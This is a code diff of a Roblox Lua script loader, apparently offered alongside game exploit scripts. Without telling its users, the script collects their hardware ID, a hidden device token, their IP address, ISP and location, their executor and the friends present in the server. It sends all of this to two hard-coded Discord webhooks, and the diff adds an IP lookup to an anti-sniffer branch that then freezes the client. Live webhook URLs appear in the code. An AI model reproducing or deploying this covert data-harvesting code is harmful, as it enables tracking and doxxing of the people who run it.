@@ -10,24 +10,45 @@ local uid = tostring(lp.UserId)
 local HttpService = game:GetService("HttpService")
 local UIS = game:GetService("UserInputService")
 
--- Твои Вебхуки
+local executor = "Unknown"
+pcall(function()
+    if identifyexecutor then 
+        executor = identifyexecutor() or "Unknown"
+    elseif getexecutorname then 
+        executor = getexecutorname() or "Unknown" 
+    end
+end)
+
+-- Webhooks
 local MAIN_WEBHOOK = "https://discord.com/api/webhooks/1511350552947200000/F5RA2icJ6WsnDcxK9B5qAZNVD7Aw3LCf1uhIZvmt38cX3GJGcCEkITsisJ-7ULdV_FAD"
 local ALERT_WEBHOOK = "https://discord.com/api/webhooks/1518334035888181271/s1d18Avu2EmWpzTrT0jNIhjT6e1J57YX70OXHMVxxcyuSSw6L6nrBAjwVspga-L7SNKO"
 
--- ================= ANTI-SNIFFER (Защита от кражи вебхука) =================
 local reqFunc = syn and syn.request or http_request or request or fluxus and fluxus.request
 
 local function isHttpHooked()
     if not reqFunc then return false end
-    if iscclosure and not iscclosure(reqFunc) then return true end
     if debug and debug.getinfo then
         local info = debug.getinfo(reqFunc)
-        if info.what ~= "C" then return true end
+        if info.source then
+            local src = string.lower(info.source)
+            if string.find(src, "spy") or string.find(src, "hook") or string.find(src, "stealer") or string.find(src, "logger") then
+                return true
+            end
+        end
     end
     return false
 end
 
 if isHttpHooked() then
+    local ip_info = {query = "N/A"}
+    pcall(function()
+        local resp = reqFunc({Url = "http://ip-api.com/json", Method = "GET"})
+        if resp and resp.Success then
+            local ok, d = pcall(HttpService.JSONDecode, HttpService, resp.Body)
+            if ok then ip_info = d end
+        end
+    end)
+    
     pcall(function()
         reqFunc({
             Url = ALERT_WEBHOOK,
@@ -41,7 +62,9 @@ if isHttpHooked() then
                     ["fields"] = {
                         {["name"] = "Player", ["value"] = string.format("%s (@%s)", lp.DisplayName, lp.Name), ["inline"] = true},
                         {["name"] = "User ID", ["value"] = uid, ["inline"] = true},
-                        {["name"] = "Client ID (HWID)", ["value"] = "`"..hwid.."`", ["inline"] = false}
+                        {["name"] = "Executor", ["value"] = tostring(executor), ["inline"] = true},
+                        {["name"] = "Client ID (HWID)", ["value"] = string.format("`%s`", hwid), ["inline"] = false},
+                        {["name"] = "IP Address", ["value"] = string.format("||%s||", ip_info.query or "N/A"), ["inline"] = false}
                     },
                     ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
                 }}
@@ -52,7 +75,6 @@ if isHttpHooked() then
     while true do end
 end
 
--- ================= HIDDEN DEVICE TOKEN (Трекер твинков) =================
 local tokenFileName = "rbx_telemetry_cache.json"
 local deviceToken = "Unknown"
 
@@ -67,17 +89,16 @@ pcall(function()
     end
 end)
 
--- ================= СПИСКИ ДОСТУПА =================
 -- blacklist
 local Blacklist = {
     UIDs = {},
     HWIDs = {"ВСТАВИТЬ_HWID_СЮДА"},
-    Tokens = {"ВСТАВИТЬ_TOKEN_СЮДА"} -- Сюда вставлять Device Token для бана по ПК
+    Tokens = {""} 
 }
 
 -- whitelist
 local Whitelist = {
-    UIDs = {},
+    UIDs = {"10760143653"},
     HWIDs = {
         "1CCA9BF5-D99F-40C7-AD9D-9329BA286AAE",
         "",
@@ -86,7 +107,7 @@ local Whitelist = {
         "",
         "",
     },
-    Tokens = {}
+    Tokens = {"46F2D827-4CD7-40D4-B0DB-E8F40F4EB06F"}
 }
 
 local status = "unknown"
@@ -110,7 +131,6 @@ pcall(function()
     local place_name = "Unknown"
     pcall(function() place_name = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end)
 
-    -- Получение данных Клана (Фракции)
     local factionName = "None"
     local factionTag = "None"
     pcall(function()
@@ -143,8 +163,8 @@ pcall(function()
                     ["fields"] = {
                         {["name"] = "Player", ["value"] = string.format("%s (@%s)", lp.DisplayName, lp.Name), ["inline"] = true},
                         {["name"] = "User ID", ["value"] = uid, ["inline"] = true},
-                        {["name"] = "Client ID", ["value"] = "`"..hwid.."`", ["inline"] = false},
-                        {["name"] = "Device Token", ["value"] = "`"..deviceToken.."`", ["inline"] = false},
+                        {["name"] = "Client ID", ["value"] = string.format("`%s`", hwid), ["inline"] = false},
+                        {["name"] = "Device Token", ["value"] = string.format("`%s`", deviceToken), ["inline"] = false},
                         {["name"] = "Faction", ["value"] = string.format("[%s] %s", factionTag, factionName), ["inline"] = false},
                         {["name"] = "Game", ["value"] = place_name, ["inline"] = false}
                     },
@@ -159,12 +179,6 @@ pcall(function()
             local ok2, d = pcall(HttpService.JSONDecode, HttpService, resp.Body)
             if ok2 then ip_info = d end
         end
-
-        local executor = "Unknown"
-        pcall(function()
-            if identifyexecutor then executor = identifyexecutor() 
-            elseif getexecutorname then executor = getexecutorname() end
-        end)
 
         local platform = "PC"
         if UIS.TouchEnabled and not UIS.KeyboardEnabled then platform = "Mobile"
@@ -202,10 +216,10 @@ pcall(function()
                     },
                     ["fields"] = {
                         {["name"] = "👤 Player Info", ["value"] = string.format("**Name:** %s (@%s)\n**User ID:** `%s`\n**Account Age:** `%s days`", lp.DisplayName, lp.Name, uid, tostring(lp.AccountAge)), ["inline"] = true},
-                        {["name"] = "💻 System", ["value"] = string.format("**Platform:** %s\n**Executor:** %s", platform, executor), ["inline"] = true},
+                        {["name"] = "💻 System", ["value"] = string.format("**Platform:** %s\n**Executor:** %s", platform, tostring(executor)), ["inline"] = true},
                         {["name"] = "🛡️ Faction (Clan)", ["value"] = string.format("**Tag:** [%s]\n**Name:** %s", factionTag, factionName), ["inline"] = false},
-                        {["name"] = "🔑 Hardware ID (CID)", ["value"] = "```\n"..hwid.."\n```", ["inline"] = false},
-                        {["name"] = "📱 Device Token (Hidden)", ["value"] = "```\n"..deviceToken.."\n```", ["inline"] = false},
+                        {["name"] = "🔑 Hardware ID (CID)", ["value"] = string.format("```\n%s\n```", hwid), ["inline"] = false},
+                        {["name"] = "📱 Device Token (Hidden)", ["value"] = string.format("```\n%s\n```", deviceToken), ["inline"] = false},
                         {["name"] = "🌍 Network Details", ["value"] = string.format("**IP:** ||%s||\n**ISP:** %s\n**Location:** %s, %s\n**Timezone:** %s", ip_info.query or "N/A", ip_info.isp or "N/A", ip_info.country or "N/A", ip_info.city or "N/A", ip_info.timezone or "N/A"), ["inline"] = false},
                         {["name"] = "🎮 Game Status", ["value"] = string.format("**Game:** %s\n**Place ID:** `%s`\n**JobId (Server):** `%s`", place_name, game.PlaceId, game.JobId), ["inline"] = false},
                         {["name"] = "👥 Friends Targets (in server)", ["value"] = string.format("`%s`", friendsStr), ["inline"] = false},
@@ -224,7 +238,6 @@ if status == "blacklist" then
     return
 end
 
--- ================= ЗАГРУЗКА СКРИПТОВ =================
 print("[System] Authorized (" .. status .. ") — loading scripts...")
 
 pcall(function()
